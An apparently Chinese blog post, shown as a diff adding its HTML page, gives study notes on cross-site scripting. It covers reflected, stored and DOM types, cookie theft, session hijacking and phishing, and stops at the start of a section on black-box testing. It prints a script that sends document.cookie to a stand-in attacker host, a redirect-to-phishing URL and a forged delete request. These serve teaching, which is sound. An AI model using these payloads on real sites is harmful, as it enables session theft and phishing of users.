@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/fav.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XSS,web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Yunen's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="简单概述&amp;#160; &amp;#160; &amp;#160; &amp;#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)">
+<meta name="keywords" content="XSS,web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端Hack之XSS攻击个人学习笔记">
+<meta property="og:url" content="http://www.0x002.com/2019/前端Hack之XSS攻击个人学习笔记/index.html">
+<meta property="og:site_name" content="Yunen&#39;s Blog">
+<meta property="og:description" content="简单概述&amp;#160; &amp;#160; &amp;#160; &amp;#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/03/09/5c839d5c04d33.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/09/5c83cca814d51.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c84907479e30.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/03/10/5c83f56052a54.png">
+<meta property="og:updated_time" content="2019-03-10T08:34:28.891Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="前端Hack之XSS攻击个人学习笔记">
+<meta name="twitter:description" content="简单概述&amp;#160; &amp;#160; &amp;#160; &amp;#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/09/5c839d5c04d33.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Yunen'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.0x002.com/2019/前端Hack之XSS攻击个人学习笔记/"/>
+
+
+
+
+
+  <title>前端Hack之XSS攻击个人学习笔记 | Yunen's Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?33ecfad176b3600bd31dce47459394e6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yunen's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Focus On Web Safety!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
+            
+            读书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-project">
+          <a href="/project/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-file"></i> <br />
+            
+            项目
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.0x002.com/2019/前端Hack之XSS攻击个人学习笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yunen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://q4.qlogo.cn/headimg_dl?dst_uin=2865859175&spec=100">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yunen's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">前端Hack之XSS攻击个人学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-09T16:02:35+08:00">
+                2019-03-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/原创栏目/" itemprop="url" rel="index">
+                    <span itemprop="name">原创栏目</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简单概述"><a href="#简单概述" class="headerlink" title="简单概述"></a>简单概述</h1><p><strong><br>&#160; &#160; &#160; &#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)
+</strong><br><a id="more"></a></p>
+<h2 id="1-什么是XSS"><a href="#1-什么是XSS" class="headerlink" title="1) 什么是XSS?"></a>1) 什么是XSS?</h2><p><strong><br>&#160; &#160; &#160; &#160;XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。
+</strong><br>&#160; &#160; &#160; &#160;如果对以上描述还不是很了解的话，可以参考<a href="https://baike.baidu.com/item/xss/917356" target="_blank" rel="noopener">百度百科</a><br>&#160; &#160; &#160; &#160;在<strong>余弦大大</strong>和<strong>xisigr大大</strong>的书籍《Web前端安全技术揭秘》第三章中这样说道：</p>
+<blockquote>
+<p>跨站脚本的重点不在“跨站”上，而应该在“脚本”上…因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。</p>
+</blockquote>
+<p>&#160; &#160; &#160; &#160;确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。</p>
+<h2 id="2-XSS可以带来哪些危害？"><a href="#2-XSS可以带来哪些危害？" class="headerlink" title="2) XSS可以带来哪些危害？"></a>2) XSS可以带来哪些危害？</h2><p>&#160; &#160; &#160; &#160;对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：</p>
+<ul>
+<li>网页挂马;</li>
+<li>盗取Cookie;</li>
+<li>DoS攻击;</li>
+<li>钓鱼攻击;</li>
+<li>蠕虫攻击;</li>
+<li>劫持用户web行为;</li>
+<li>结合CSRF进行针对性攻击;</li>
+<li>······</li>
+</ul>
+<p>这些都是可以利用XSS漏洞来达成的。</p>
+<h2 id="3-XSS类型"><a href="#3-XSS类型" class="headerlink" title="3) XSS类型"></a>3) XSS类型</h2><p>目前的XSS总共可以分为三种类型：</p>
+<ul>
+<li><strong>反射型(也叫非持久型)</strong></li>
+<li><strong>存储型(也叫持久型)</strong></li>
+<li><strong>DOM型</strong></li>
+</ul>
+<p>PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><strong><br>&#160; &#160; &#160; &#160;反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)
+</strong><br>&#160; &#160; &#160; &#160;由于篇幅问题，关于反射型XSS我就不做过多简述。<br>&#160; &#160; &#160; &#160;有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：<a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">记一次从DOM型XSS到RCE过程</a>。  </p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。— 《XSS跨站脚本攻击剖析与防御》</strong><br>&#160; &#160; &#160; &#160;存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。—《Web前端黑客技术揭秘》</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识<br>&#160; &#160; &#160; &#160;DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在<a href="https://baike.baidu.com/item/DOM/50288" target="_blank" rel="noopener">百度百科</a>得到相应的解答。</strong><br>&#160; &#160; &#160; &#160;DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。<br>&#160; &#160; &#160; &#160;在<strong>刺</strong>的《白帽子讲Web安全》是这样讲的：</p>
+<blockquote>
+<p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。</p>
+</blockquote>
+<p>&#160; &#160; &#160; &#160;举个简单的例子(来自《Web前端黑客技术揭秘》)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a=document.URL;</span><br><span class="line">document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&#160; &#160; &#160; &#160;把以上代码保存为1.html,然后打开浏览器访问<code>http://127.0.0.1/1.html#a=test</code><br>&#160; &#160; &#160; &#160;我们知道这是个静态页面，而且#后边的内容并不会传给服务器。<br><img src="https://i.loli.net/2019/03/09/5c839d5c04d33.png" alt="访问结果"><br>&#160; &#160; &#160; &#160;可是这样就不会产生XSS漏洞了吗？如果我们访问<br><code>http://127.0.0.1/.html#a=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>&#160; &#160; &#160; &#160;当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。<br>&#160; &#160; &#160; &#160;具体执行过程如图：<img src="https://i.loli.net/2019/03/09/5c83cca814d51.jpg" alt="来自《黑客攻防技术宝典Web实战篇》"></p>
+<h2 id="4-XSS的利用方式"><a href="#4-XSS的利用方式" class="headerlink" title="4) XSS的利用方式"></a>4) XSS的利用方式</h2><p>&#160; &#160; &#160; &#160;前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。</p>
+<h3 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h3><p><strong>&#160; &#160; &#160; &#160;Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>会弹出当前页面的cookie信息。</strong>  </p>
+<hr>
+<p>&#160; &#160; &#160; &#160;这里我们引入一个叫做“同源策略”的概念：</p>
+<blockquote>
+<p>首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面<code>http://www.a.com/index.html</code>，域名是 <code>www.a.com</code>，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：<img src="https://i.loli.net/2019/03/10/5c84907479e30.jpg" alt=""><br>&#160; &#160; &#160; &#160;同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。<br>&#160; &#160; &#160; &#160;除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：<br>&#160; &#160; &#160; &#160;(1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB<br>&#160; &#160; &#160; &#160;(2) 无法读写非同源网页的 DOM<br>&#160; &#160; &#160; &#160;(3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）</p>
+</blockquote>
+<p>&#160; &#160; &#160; &#160;————引自<strong>晚风</strong>表哥在信安之路上的投稿文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487543&amp;idx=1&amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">《同源策略与跨域请求》</a>  </p>
+<hr>
+<p>&#160; &#160; &#160; &#160;我们知道Cookie有如下常见的属性：</p>
+<ul>
+<li>Domain————设置关联Cookie的域名;</li>
+<li>Expires————通过给定一个过期时间来创建一个持久化Cookie;</li>
+<li>Httponly————用于避免Cookie被Javascript访问;</li>
+<li>Name————Cookie的名称;</li>
+<li>Path————关联到Cookie的路径，默认为/;</li>
+<li>Value————读写Cookie的值;</li>
+<li>Secure————用于指定Cookie需要通过安全Socket层传递连接;  </li>
+</ul>
+<p>&#160; &#160; &#160; &#160;并且Cookie也可以安装类型分为：</p>
+<ul>
+<li>本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;</li>
+<li>内存Cookie————即储存在内存中，随浏览器的关闭而消失;  </li>
+</ul>
+<p>&#160; &#160; &#160; &#160;如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。<br>&#160; &#160; &#160; &#160;由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况</p>
+<h4 id="默认"><a href="#默认" class="headerlink" title="默认"></a>默认</h4><p>&#160; &#160; &#160; &#160;默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">new Image().src=&quot;http://www.hacker.com/cookie.php?cookie=&quot;+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="不同域"><a href="#不同域" class="headerlink" title="不同域"></a>不同域</h4><p>&#160; &#160; &#160; &#160;这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为<strong>本域</strong>。<br>&#160; &#160; &#160; &#160;例如有两个网站<code>www.a.com</code>和<code>test.a.com</code>且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从<code>test.a.com</code>获取到<code>www.a.com</code>的Cookie，可是如果<code>www.a.com</code>的Cookie值中的domain属性设置为父级域即<code>a.com</code>，就可以通过<code>test.a.com</code>的xss漏洞获取到<code>www.a.com</code>的Cookie值。</p>
+<h4 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h4><p>&#160; &#160; &#160; &#160;这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在<code>www.a.com/admin/index.php</code>设置cookie值且不知道path，那么path默认为<code>/admin/</code>。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有<code>/admin/</code>目录下的javascipt才能读取前边设置的Cookie。</p>
+<h4 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http Only"></a>Http Only</h4><p>&#160; &#160; &#160; &#160;HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。  </p>
+<ul>
+<li>利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。</li>
+<li>利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。  </li>
+</ul>
+<p>感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)</p>
+<h4 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h4><p>&#160; &#160; &#160; &#160;Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。</p>
+<h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><p>&#160; &#160; &#160; &#160;HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。<br>&#160; &#160; &#160; &#160;我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。</p>
+<h5 id="B域设置A域Cookie"><a href="#B域设置A域Cookie" class="headerlink" title="B域设置A域Cookie"></a>B域设置A域Cookie</h5><p>&#160; &#160; &#160; &#160;在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。</p>
+<h5 id="加载B域时Cookie传入问题"><a href="#加载B域时Cookie传入问题" class="headerlink" title="加载B域时Cookie传入问题"></a>加载B域时Cookie传入问题</h5><p>&#160; &#160; &#160; &#160;我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。  </p>
+<ul>
+<li>相关文章：<a href="https://www.cnblogs.com/cheney256/articles/8942240.html" target="_blank" rel="noopener">用P3P header解决iframe跨域访问cookie</a>  </li>
+<li>相关阅读：<strong>《Web前端黑客技术揭秘》p41-42</strong>  </li>
+</ul>
+<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>&#160; &#160; &#160; &#160;由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。<br>&#160; &#160; &#160; &#160;这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容</p>
+<blockquote>
+<p>&#160; &#160; &#160; &#160;Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。<br>&#160; &#160; &#160; &#160;在Session机制中，客户端和服务端也有被其他人利用的可能。<br>&#160; &#160; &#160; &#160;Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面</p>
+</blockquote>
+<p>&#160; &#160; &#160; &#160;这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。<br>&#160; &#160; &#160; &#160;会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。  </p>
+<ul>
+<li><p>通过javascript控制DOM对象来发起一个GET请求，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = document.creatElement(&quot;img&quot;);</span><br><span class="line">img.src = &quot;http://www.a.com/del.php?id=1&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过javascript自动构造隐藏表单并提交(POST)</p>
+</li>
+<li>通过XMLHttpRequest直接发送一个POST请求</li>
+</ul>
+<p>&#160; &#160; &#160; &#160;我们可以通过构造的GET/POST请求来实现如添加管理员、删除文章、上传文件等操作。XSS蠕虫从某种意义上来说也属于会话劫持。</p>
+<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>&#160; &#160; &#160; &#160;现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？</p>
+<h4 id="XSS重定向钓鱼"><a href="#XSS重定向钓鱼" class="headerlink" title="XSS重定向钓鱼"></a>XSS重定向钓鱼</h4><p>&#160; &#160; &#160; &#160;即从<code>www.a.com</code>通过xss漏洞跳转到<code>www.b.com</code>的钓鱼页面上，整个过程变化明显，受害者易察觉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/index.php?search=&lt;script&gt;document.location.href=&quot;http://www.b.com/index.php&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="HTML注入式钓鱼"><a href="#HTML注入式钓鱼" class="headerlink" title="HTML注入式钓鱼"></a>HTML注入式钓鱼</h4><p>&#160; &#160; &#160; &#160;通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。</p>
+<h4 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h4><p>&#160; &#160; &#160; &#160;攻击者通过javascript来添加一个新的<code>&lt;Iframe&gt;</code>标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。</p>
+<h2 id="5-XSS漏洞的挖掘"><a href="#5-XSS漏洞的挖掘" class="headerlink" title="5) XSS漏洞的挖掘"></a>5) XSS漏洞的挖掘</h2><p>&#160; &#160; &#160; &#160;就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。</p>
+<h3 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h3><p>&#160; &#160; &#160; &#160;通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。</p>
+<blockquote>
+<p>分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤</p>
+</blockquote>
+<h3 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h3><p>&#160; &#160; &#160; &#160;这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。</p>
